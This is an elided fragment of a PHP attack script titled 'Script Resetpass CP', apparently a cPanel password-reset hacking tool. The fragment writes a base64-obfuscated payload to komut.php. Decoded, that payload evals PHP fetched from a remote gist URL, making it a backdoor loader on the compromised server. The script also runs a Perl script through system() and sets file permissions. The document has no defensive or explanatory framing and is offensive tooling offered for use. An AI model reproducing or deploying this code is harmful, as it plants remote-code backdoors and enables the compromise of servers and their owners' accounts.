...
fclose($filex);
$netcatshellr = 'PD9waHAgZXZhbCgiPz4iLmZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JhbGFzbmlwZXIvZTcwYjQzZmE3ZjEyNjhkYjRmYjY3ZGIxOTc3YjQwMGYvcmF3LzU5MmE5MDY5YWU3ODQxMmI2NDFmNmYxNjEwNzMxZDEwNmE5YTIwYzYva29tdXQucGhwIikpOz8+';

$filexr = fopen("komut.php" ,"w+");
$write = fwrite ($filexr ,base64_decode($netcatshellr));
fclose($filexr);
    chmod("sen.za",0755);
}
?>
...
fclose($filezx);
@system('perl s.pl');
$netcatshell = 'PD9waHAgZXZhbCgiPz4iLmZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JhbGFzbmlwZXIvZTcwYjQzZmE3ZjEyNjhkYjRmYjY3ZGIxOTc3YjQwMGYvcmF3LzU5MmE5MDY5YWU3ODQxMmI2NDFmNmYxNjEwNzMxZDEwNmE5YTIwYzYva29tdXQucGhwIikpOz8+';
...
echo '<html>
    ...
    <p><h2>Script Resetpass CP</h2></p>
	 <p><h2>Coded By MISTER SPY 2</h2></p>
	<p>   
